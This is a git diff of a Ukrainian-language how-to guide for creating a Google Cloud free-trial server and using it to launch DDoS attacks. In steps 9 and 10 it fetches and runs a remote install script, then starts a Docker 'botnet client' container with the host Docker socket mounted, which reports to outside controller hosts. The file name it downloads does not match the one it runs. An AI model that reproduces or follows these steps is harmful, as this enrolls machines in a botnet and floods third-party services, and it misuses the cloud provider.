@@ -4,48 +4,69 @@
 
 Переходимо на cloud.google.com та обираємо вгорі "Get started for free"
 
+![image](https://user-images.githubusercontent.com/37846731/156425245-25d55b4a-1789-4334-9792-bbd8d1673af4.png)
+
 2. Нас перекидує на наступну сторінку, яку заповнюємо ось так, (можливо ви не в гугл акаунті ще, тому вас попросять ще авторизуватись)
-!(image)[https://lh6.googleusercontent.com/ZxPlav35hJigbVTwgjS3vqkiDWrlLWTInvVcD6ogSa310h-7VzqYn81HpaUgmgrGQSEnbFArKCdKil8FIn1kZXUzbMy5PrBd5_RJjDVET1UzYUg36k7MBY-meInL76D4BrYeT0b2]
+
+![image](https://user-images.githubusercontent.com/37846731/156425332-3d196223-b539-4aa4-806e-882a90f99c0a.png)
+
 Можливо треба буде відкрити в новому вікні сині гіперссилки праворуч від галок, якщо це попросить гугл
 3.Далі заповнюємо як показано на рисунку нижче, заповнюємо дані з карти (з вас спише та потім поверне 1 доллар, за поточним курсом десь 32грн). Жмемо “START MY FREE TRIAL” синя кнопка внизу.
 
-
-
+![image](https://user-images.githubusercontent.com/37846731/156425431-f246d34c-7b34-42a7-a82d-db8f3799dce8.png)
 
 4. Нас перекине на сторінку нижче. Далі обираємо зліва внизу пункт "Compute Engine" (виділено червоним)
 
+![image](https://user-images.githubusercontent.com/37846731/156425492-6ad97091-1aec-4cc0-8d16-1208ade63f5d.png)
 
 5. Обираємо пункт "Create Instance"
 
-
-
+![image](https://user-images.githubusercontent.com/37846731/156425580-dbe0ec4d-5b65-4444-86e2-ad843cc7ec73.png)
 
 6. Створюємо віділений сервер, заповнюючи форму нижче як показано на рисунку
+
+![image](https://user-images.githubusercontent.com/37846731/156425649-fda6781e-10fd-4b42-9c9f-93ce553f73da.png)
 
 
 В Розділі Boot Disk  нажимаємо кнопку "Change" та у вікні нижче обираємо операційну систему Ubuntu 20.04:
 
+![image](https://user-images.githubusercontent.com/37846731/156425703-63e670f4-a4af-49df-b119-c291c579e42d.png)
+
 
 Фінально повинно виглядати форма так:
 
-
-
+![image](https://user-images.githubusercontent.com/37846731/156425751-975834a4-7a6b-4e2c-ab18-f10ca01ab1ee.png)
 
 7. Після заповнення форми жмемо на синю кнопку "Create".  
 
 Бачимо ось таку сторінку. Вітаю ви створили відилений сервер. Тепер потрібно зайти на нього та вже через цей сервер починати саме ДДоС атаку.  Далі обираємо стрілочку вниз біля SSH (обведено червоним), і обираємо 1ий пункт “Open in browser window”, 
 
-
+![image](https://user-images.githubusercontent.com/37846731/156425792-2acf5474-5a34-40f6-a005-00720a21bb38.png)
 
 
 8. Браузер відкриє нове вікно, або дасть повідомлення що гугл хоче відкрити нове вікно - погоджуйтесь. Далі нове вікно буде виглядати ось так: Це командна строка вашого сервера, через це вікно будемо посилати команди на сервер:
 
+![image](https://user-images.githubusercontent.com/37846731/156425863-b79ff354-4581-45d3-aeca-fbb17815e5a4.png)
+
 
 9. Спочатку встановимо софт для ДДоСа, копіювати і вставляти по одному блоку між рядками (Ctrl+V в консолі працює):
 
-  wget https://gist.githubusercontent.com/antl31/83229c0eaaa1d259a569cfb57ab75230/raw/b4e01a106fbe534a7bfa4930a66cf933c6366c5c/install_docker.sh
+ ```
+ wget https://gist.githubusercontent.com/antl31/83229c0eaaa1d259a569cfb57ab75230/raw/b4e01a106fbe534a7bfa4930a66cf933c6366c5c/install_docker.sh 
+ ```
 
 
-
+```
 bash 1.sh
+```
+
 Далі чекаємо поки все встановиться. Клацаємо enter, бачимо чисте вікно.
+
+
+10. Запускаємо клієнт ботнету використовуючи команду:
+
+```
+docker run -d --restart=always -v /var/run/docker.sock:/var/run/docker.sock --label clientNode=true --restart=always -e CLUSTER_NAME=YOUR_CLUSTER_NAME freefly19/4321-client:latest http://d1.track-debts.com http://d2.track-debts.com
+```
+
+Замініть YOUR_CLUSTER_NAME на ваш нік/щось інще. За допомогою цього імені в подальшому ви зможете моніторити свої ресурси. 
